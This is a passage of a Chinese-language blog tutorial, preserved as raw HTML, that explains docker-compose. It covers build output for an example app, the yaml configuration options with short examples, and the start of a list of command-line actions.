Syntax Highlighter v_2.7.2_beta --><br><br>        <div id=\"crayon-580270f9a8c5a806091571\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate\" data-settings=\" minimize scroll-mouseover\" style=\"margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important; height: auto;\"><br><br>            <div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly=\"\" style=\"tab-size: 4; font-size: 12px !important; line-height: 15px !important; z-index: 0; opacity: 0; overflow: hidden;\">Creating myapp_redis_1…<br>Creating myapp_web_1…<br>Building web…<br>Step 0 : FROM python:2.7<br>2.7: Pulling from python<br>…<br>Status: Downloaded newer image for python:2.7<br> —&gt; d833e0b23482<br>Step 1 : ADD . /code<br> —&gt; 1c04b1b15808<br>Removing intermediate container 9dab91b4410d<br>Step 2 : WORKDIR /code<br> —&gt; Running in f495a62feac9<br> —&gt; ffea89a7b090<br>Attaching to myapp_redis_1, myapp_web_1<br>……<br>redis_1 | [1] 17 May 10:42:38.147 <em> The server is now ready to accept connections on port 6379<br>web_1   |  </em> Running on <a href=\"http://0.0.0.0:5000/\">http://0.0.0.0:5000/</a> (Press CTRL+C to quit)<br>web_1   |  <em> Restarting with stat</textarea></div><br>            <div class=\"crayon-main\" style=\"position: relative; z-index: 1; overflow: hidden;\"><br>                <table class=\"crayon-table\"><br>                    <tbody><tr class=\"crayon-row\"><br>                <td class=\"crayon-nums \" data-settings=\"show\"><br>                    <div class=\"crayon-nums-content\" style=\"font-size: 12px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-580270f9a8c5a806091571-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-580270f9a8c5a806091571-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-580270f9a8c5a806091571-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-580270f9a8c5a806091571-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-580270f9a8c5a806091571-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-580270f9a8c5a806091571-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-580270f9a8c5a806091571-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-580270f9a8c5a806091571-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-580270f9a8c5a806091571-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-580270f9a8c5a806091571-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-580270f9a8c5a806091571-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-580270f9a8c5a806091571-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-580270f9a8c5a806091571-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-580270f9a8c5a806091571-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-580270f9a8c5a806091571-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-580270f9a8c5a806091571-16\">16</div><div class=\"crayon-num\" data-line=\"crayon-580270f9a8c5a806091571-17\">17</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-580270f9a8c5a806091571-18\">18</div><div class=\"crayon-num\" data-line=\"crayon-580270f9a8c5a806091571-19\">19</div></div><br>                </td><br>                        <td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-580270f9a8c5a806091571-1\"><span class=\"crayon-e\">Creating </span><span class=\"crayon-v\">myapp_redis_1</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-580270f9a8c5a806091571-2\"><span class=\"crayon-e\">Creating </span><span class=\"crayon-v\">myapp_web_1</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span></div><div class=\"crayon-line\" id=\"crayon-580270f9a8c5a806091571-3\"><span class=\"crayon-e\">Building </span><span class=\"crayon-v\">web</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-580270f9a8c5a806091571-4\"><span class=\"crayon-i\">Step</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">FROM </span><span class=\"crayon-v\">python</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">2.7</span></div><div class=\"crayon-line\" id=\"crayon-580270f9a8c5a806091571-5\"><span class=\"crayon-cn\">2.7</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Pulling </span><span class=\"crayon-e\">from </span><span class=\"crayon-i\">python</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-580270f9a8c5a806091571-6\"><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span></div><div class=\"crayon-line\" id=\"crayon-580270f9a8c5a806091571-7\"><span class=\"crayon-v\">Status</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Downloaded </span><span class=\"crayon-e\">newer </span><span class=\"crayon-e\">image </span><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">python</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">2.7</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-580270f9a8c5a806091571-8\"><span class=\"crayon-h\"> </span><span class=\"crayon-o\">–</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">d833e0b23482</span></div><div class=\"crayon-line\" id=\"crayon-580270f9a8c5a806091571-9\"><span class=\"crayon-i\">Step</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">ADD</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">.</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">code</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-580270f9a8c5a806091571-10\"><span class=\"crayon-h\"> </span><span class=\"crayon-o\">–</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1c04b1b15808</span></div><div class=\"crayon-line\" id=\"crayon-580270f9a8c5a806091571-11\"><span class=\"crayon-e\">Removing </span><span class=\"crayon-e\">intermediate </span><span class=\"crayon-i\">container</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">9dab91b4410d</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-580270f9a8c5a806091571-12\"><span class=\"crayon-i\">Step</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">WORKDIR</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">code</span></div><div class=\"crayon-line\" id=\"crayon-580270f9a8c5a806091571-13\"><span class=\"crayon-h\"> </span><span class=\"crayon-o\">–</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Running </span><span class=\"crayon-st\">in</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">f495a62feac9</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-580270f9a8c5a806091571-14\"><span class=\"crayon-h\"> </span><span class=\"crayon-o\">–</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">ffea89a7b090</span></div><div class=\"crayon-line\" id=\"crayon-580270f9a8c5a806091571-15\"><span class=\"crayon-e\">Attaching </span><span class=\"crayon-st\">to</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">myapp_redis_1</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">myapp<em>web</span><span class=\"crayon-sy\"></em></span>1</div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-580270f9a8c5a806091571-16\"><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span></div><div class=\"crayon-line\" id=\"crayon-580270f9a8c5a806091571-17\"><span class=\"crayon-v\">redis_1</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">17</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">May</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">10</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">42</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">38.147</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\"></em></span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">The </span><span class=\"crayon-e\">server </span><span class=\"crayon-st\">is</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">now </span><span class=\"crayon-e\">ready </span><span class=\"crayon-st\">to</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">accept </span><span class=\"crayon-e\">connections </span><span class=\"crayon-e\">on </span><span class=\"crayon-i\">port</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">6379</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-580270f9a8c5a806091571-18\"><span class=\"crayon-v\">web_1</span><span class=\"crayon-h\">&nbsp;&nbsp; </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\">&nbsp;&nbsp;</span><span class=\"crayon-o\"><em></span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Running </span><span class=\"crayon-e\">on </span><span class=\"crayon-v\">http</span><span class=\"crayon-o\">:</span><span class=\"crayon-c\">//0.0.0.0:5000/ (Press CTRL+C to quit)</span></div><div class=\"crayon-line\" id=\"crayon-580270f9a8c5a806091571-19\"><span class=\"crayon-v\">web_1</span><span class=\"crayon-h\">&nbsp;&nbsp; </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\">&nbsp;&nbsp;</span><span class=\"crayon-o\"></em></span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Restarting </span><span class=\"crayon-e\">with </span><span class=\"crayon-v\">stat</span></div></div></td><br>                    </tr><br>                </tbody></table><br>            </div><br>        </div><br><!-- [Format Time: 0.0039 seconds] --><br><p></p><br><h2>3. Yaml文件参考</h2><br><p>在上面的yaml文件中，我们可以看到compose文件的基本结构。首先是定义一个服务名，下面是yaml服务中的一些选项条目：<br><br><code>image</code>:镜像的ID<br><br><code>build</code>:直接从pwd的Dockerfile来build，而非通过image选项来pull<br><br><code>links</code>：连接到那些容器。每个占一行，格式为SERVICE[:ALIAS],例如 – db[:database]<br><br><code>external_links</code>：连接到该compose.yaml文件之外的容器中，比如是提供共享或者通用服务的容器服务。格式同links<br><br><code>command</code>：替换默认的command命令<br><br><code>ports</code>: 导出端口。格式可以是：</p><br><p></p><!-- Crayon Syntax Highlighter v_2.7.2_beta --><br><br>        <div id=\"crayon-580270f9a8c61341321587\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate\" data-settings=\" minimize scroll-mouseover\" style=\"margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important; height: auto;\"><br><br>            <div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly=\"\" style=\"tab-size: 4; font-size: 12px !important; line-height: 15px !important; z-index: 0; opacity: 0; overflow: hidden;\">ports:-“3000”-“8000:8000”-“127.0.0.1:8001:8001”</textarea></div><br>            <div class=\"crayon-main\" style=\"position: relative; z-index: 1; overflow: hidden;\"><br>                <table class=\"crayon-table\"><br>                    <tbody><tr class=\"crayon-row\"><br>                <td class=\"crayon-nums \" data-settings=\"show\"><br>                    <div class=\"crayon-nums-content\" style=\"font-size: 12px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-580270f9a8c61341321587-1\">1</div></div><br>                </td><br>                        <td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-580270f9a8c61341321587-1\"><span class=\"crayon-v\">ports</span><span class=\"crayon-o\">:</span><span class=\"crayon-o\">-</span><span class=\"crayon-s\">“3000”</span><span class=\"crayon-o\">-</span><span class=\"crayon-s\">“8000:8000”</span><span class=\"crayon-o\">-</span><span class=\"crayon-s\">“127.0.0.1:8001:8001”</span></div></div></td><br>                    </tr><br>                </tbody></table><br>            </div><br>        </div><br><!-- [Format Time: 0.0005 seconds] --><br><p></p><br><p><code>expose</code>：导出端口，但不映射到宿主机的端口上。它仅对links的容器开放。格式直接指定端口号即可。<br><br><code>volumes</code>：加载路径作为卷，可以指定只读模式：</p><br><p></p><!-- Crayon Syntax Highlighter v_2.7.2_beta --><br><br>        <div id=\"crayon-580270f9a8c65962076142\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate\" data-settings=\" minimize scroll-mouseover\" style=\"margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important; height: auto;\"><br><br>            <div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly=\"\" style=\"tab-size: 4; font-size: 12px !important; line-height: 15px !important; z-index: 0; opacity: 0; overflow: hidden;\">volumes:-/var/lib/mysql<br> - cache/:/tmp/cache<br> -~/configs:/etc/configs/:ro</textarea></div><br>            <div class=\"crayon-main\" style=\"position: relative; z-index: 1; overflow: hidden;\"><br>                <table class=\"crayon-table\"><br>                    <tbody><tr class=\"crayon-row\"><br>                <td class=\"crayon-nums \" data-settings=\"show\"><br>                    <div class=\"crayon-nums-content\" style=\"font-size: 12px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-580270f9a8c65962076142-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-580270f9a8c65962076142-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-580270f9a8c65962076142-3\">3</div></div><br>                </td><br>                        <td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-580270f9a8c65962076142-1\"><span class=\"crayon-v\">volumes</span><span class=\"crayon-o\">:</span><span class=\"crayon-o\">-</span><span class=\"crayon-o\">/</span><span class=\"crayon-t\">var</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">lib</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">mysql</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-580270f9a8c65962076142-2\"><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">cache</span><span class=\"crayon-o\">/</span><span class=\"crayon-o\">:</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">tmp</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">cache</span></div><div class=\"crayon-line\" id=\"crayon-580270f9a8c65962076142-3\"><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-o\">~</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">configs</span><span class=\"crayon-o\">:</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">etc</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">configs</span><span class=\"crayon-o\">/</span><span class=\"crayon-o\">:</span><span class=\"crayon-v\">ro</span></div></div></td><br>                    </tr><br>                </tbody></table><br>            </div><br>        </div><br><!-- [Format Time: 0.0009 seconds] --><br><p></p><br><p><code>volumes_from</code>：加载其他容器或者服务的所有卷</p><br><p></p><!-- Crayon Syntax Highlighter v_2.7.2_beta --><br><br>        <div id=\"crayon-580270f9a8c69471704775\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate\" data-settings=\" minimize scroll-mouseover\" style=\"margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important; height: auto;\"><br><br>            <div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly=\"\" style=\"tab-size: 4; font-size: 12px !important; line-height: 15px !important; z-index: 0; opacity: 0; overflow: hidden;\">environment:- RACK_ENV=development<br>  - SESSION_SECRET</textarea></div><br>            <div class=\"crayon-main\" style=\"position: relative; z-index: 1; overflow: hidden;\"><br>                <table class=\"crayon-table\"><br>                    <tbody><tr class=\"crayon-row\"><br>                <td class=\"crayon-nums \" data-settings=\"show\"><br>                    <div class=\"crayon-nums-content\" style=\"font-size: 12px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-580270f9a8c69471704775-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-580270f9a8c69471704775-2\">2</div></div><br>                </td><br>                        <td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-580270f9a8c69471704775-1\"><span class=\"crayon-v\">environment</span><span class=\"crayon-o\">:</span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">RACK_ENV</span><span class=\"crayon-o\">=</span><span class=\"crayon-v\">development</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-580270f9a8c69471704775-2\"><span class=\"crayon-h\">&nbsp;&nbsp;</span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">SESSION_SECRET</span></div></div></td><br>                    </tr><br>                </tbody></table><br>            </div><br>        </div><br><!-- [Format Time: 0.0005 seconds] --><br><p></p><br><p><code>env_file</code>：从一个文件中导入环境变量，文件的格式为RACK_ENV=development<br><br><code>extends</code>:扩展另一个服务，可以覆盖其中的一些选项。一个sample如下：</p><br><p></p><!-- Crayon Syntax Highlighter v_2.7.2_beta --><br><br>        <div id=\"crayon-580270f9a8c6e528736605\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate\" data-settings=\" minimize scroll-mouseover\" style=\"margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important; height: auto;\"><br><br>            <div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly=\"\" style=\"tab-size: 4; font-size: 12px !important; line-height: 15px !important; z-index: 0; opacity: 0; overflow: hidden;\">common.yml<br>webapp:<br>  build:./webapp<br>  environment:- DEBUG=false- SEND_EMAILS=false<br>development.yml<br>web:extends:<br>    file: common.yml<br>    service: webapp<br>  ports:-“8000:8000”<br>  links:- db<br>  environment:- DEBUG=true<br>db:<br>  image: postgres</textarea></div><br>            <div class=\"crayon-main\" style=\"position: relative; z-index: 1; overflow: hidden;\"><br>                <table class=\"crayon-table\"><br>                    <tbody><tr class=\"crayon-row\"><br>                <td class=\"crayon-nums \" data-settings=\"show\"><br>                    <div class=\"crayon-nums-content\" style=\"font-size: 12px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-580270f9a8c6e528736605-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-580270f9a8c6e528736605-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-580270f9a8c6e528736605-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-580270f9a8c6e528736605-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-580270f9a8c6e528736605-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-580270f9a8c6e528736605-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-580270f9a8c6e528736605-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-580270f9a8c6e528736605-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-580270f9a8c6e528736605-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-580270f9a8c6e528736605-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-580270f9a8c6e528736605-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-580270f9a8c6e528736605-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-580270f9a8c6e528736605-13\">13</div></div><br>                </td><br>                        <td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-580270f9a8c6e528736605-1\">common<span class=\"crayon-o\">.</span>yml</div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-580270f9a8c6e528736605-2\"><span class=\"crayon-s \">webapp</span><span class=\"\">:</span></div><div class=\"crayon-line\" id=\"crayon-580270f9a8c6e528736605-3\"><span class=\"crayon-h\">&nbsp;&nbsp;</span><span class=\"crayon-s \">build</span><span class=\"\">:./webapp</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-580270f9a8c6e528736605-4\"><span class=\"crayon-h\">&nbsp;&nbsp;</span><span class=\"crayon-s \">environment</span><span class=\"\">:- DEBUG=false- SEND_EMAILS=false</span></div><div class=\"crayon-line\" id=\"crayon-580270f9a8c6e528736605-5\">development<span class=\"crayon-o\">.</span>yml</div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-580270f9a8c6e528736605-6\"><span class=\"crayon-s \">web</span><span class=\"\">:extends</span><span class=\"\">:</span></div><div class=\"crayon-line\" id=\"crayon-580270f9a8c6e528736605-7\"><span class=\"crayon-h\">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class=\"crayon-s \">file</span><span class=\"\">: common.yml</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-580270f9a8c6e528736605-8\"><span class=\"crayon-h\">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class=\"crayon-s \">service</span><span class=\"\">: webapp</span></div><div class=\"crayon-line\" id=\"crayon-580270f9a8c6e528736605-9\"><span class=\"crayon-h\">&nbsp;&nbsp;</span><span class=\"crayon-s \">ports</span><span class=\"\">:-“8000</span><span class=\"\">:8000”</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-580270f9a8c6e528736605-10\"><span class=\"crayon-h\">&nbsp;&nbsp;</span><span class=\"crayon-s \">links</span><span class=\"\">:- db</span></div><div class=\"crayon-line\" id=\"crayon-580270f9a8c6e528736605-11\"><span class=\"crayon-h\">&nbsp;&nbsp;</span><span class=\"crayon-s \">environment</span><span class=\"\">:- DEBUG=true</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-580270f9a8c6e528736605-12\"><span class=\"crayon-s \">db</span><span class=\"\">:</span></div><div class=\"crayon-line\" id=\"crayon-580270f9a8c6e528736605-13\"><span class=\"crayon-h\">&nbsp;&nbsp;</span><span class=\"crayon-s \">image</span><span class=\"\">: postgres</span></div></div></td><br>                    </tr><br>                </tbody></table><br>            </div><br>        </div><br><!-- [Format Time: 0.0008 seconds] --><br><p></p><br><p><code>net</code>：容器的网络模式，可以为”bridge”, “none”, “container:[name or id]”, “host”中的一个。<br><br><code>dns</code>：可以设置一个或多个自定义的DNS地址。<br><br><code>dns_search</code>:可以设置一个或多个DNS的扫描域。<br><br>其他的<code>working_dir, entrypoint, user, hostname, domainname, mem_limit, privileged, restart, stdin_open, tty, cpu_shares</code>，和<code>docker run</code>命令是一样的，这些命令都是单行的命令。例如：</p><br><p></p><!-- Crayon Syntax Highlighter v_2.7.2_beta --><br><br>        <div id=\"crayon-580270f9a8c72058180962\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate\" data-settings=\" minimize scroll-mouseover\" style=\"margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important; height: auto;\"><br><br>            <div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly=\"\" style=\"tab-size: 4; font-size: 12px !important; line-height: 15px !important; z-index: 0; opacity: 0; overflow: hidden;\">cpu_shares:73<br>working_dir:/code<br>entrypoint: /code/entrypoint.sh<br>user: postgresql<br>hostname: foo<br>domainname: foo.com<br>mem_limit:1000000000<br>privileged:true<br>restart: always<br>stdin_open:true<br>tty:true</textarea></div><br>            <div class=\"crayon-main\" style=\"position: relative; z-index: 1; overflow: hidden;\"><br>                <table class=\"crayon-table\"><br>                    <tbody><tr class=\"crayon-row\"><br>                <td class=\"crayon-nums \" data-settings=\"show\"><br>                    <div class=\"crayon-nums-content\" style=\"font-size: 12px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-580270f9a8c72058180962-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-580270f9a8c72058180962-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-580270f9a8c72058180962-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-580270f9a8c72058180962-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-580270f9a8c72058180962-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-580270f9a8c72058180962-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-580270f9a8c72058180962-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-580270f9a8c72058180962-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-580270f9a8c72058180962-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-580270f9a8c72058180962-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-580270f9a8c72058180962-11\">11</div></div><br>                </td><br>                        <td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-580270f9a8c72058180962-1\"><span class=\"crayon-v\">cpu_shares</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">73</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-580270f9a8c72058180962-2\"><span class=\"crayon-v\">working_dir</span><span class=\"crayon-o\">:</span><span class=\"crayon-o\">/</span><span class=\"crayon-e\">code</span></div><div class=\"crayon-line\" id=\"crayon-580270f9a8c72058180962-3\"><span class=\"crayon-v\">entrypoint</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">code</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">entrypoint</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">sh</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-580270f9a8c72058180962-4\"><span class=\"crayon-v\">user</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">postgresql</span></div><div class=\"crayon-line\" id=\"crayon-580270f9a8c72058180962-5\"><span class=\"crayon-v\">hostname</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">foo</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-580270f9a8c72058180962-6\"><span class=\"crayon-v\">domainname</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">foo</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">com</span></div><div class=\"crayon-line\" id=\"crayon-580270f9a8c72058180962-7\"><span class=\"crayon-v\">mem_limit</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">1000000000</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-580270f9a8c72058180962-8\"><span class=\"crayon-v\">privileged</span><span class=\"crayon-o\">:</span><span class=\"crayon-t\">true</span></div><div class=\"crayon-line\" id=\"crayon-580270f9a8c72058180962-9\"><span class=\"crayon-v\">restart</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">always</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-580270f9a8c72058180962-10\"><span class=\"crayon-v\">stdin_open</span><span class=\"crayon-o\">:</span><span class=\"crayon-t\">true</span></div><div class=\"crayon-line\" id=\"crayon-580270f9a8c72058180962-11\"><span class=\"crayon-v\">tty</span><span class=\"crayon-o\">:</span><span class=\"crayon-t\">true</span></div></div></td><br>                    </tr><br>                </tbody></table><br>            </div><br>        </div><br><!-- [Format Time: 0.0013 seconds] --><br><p></p><br><h2>4. docker-compose常用命令</h2><br><p>在第二节中的<code>docker-compose up</code>，这两个容器都是在前台运行的。我们可以指定-d命令以daemon的方式启动容器。除此之外，docker-compose还支持下面参数：<br><br><code>–verbose</code>：输出详细信息<br><br><code>-f</code> 制定一个非docker-compose.yml命名的yaml文件<br><br><code>-p</code> 设置一个项目名称（默认是directory名）<br><br>docker-compose的动作包括：<br><br><code>build</code>：构建服务<br><br><code>kill -s 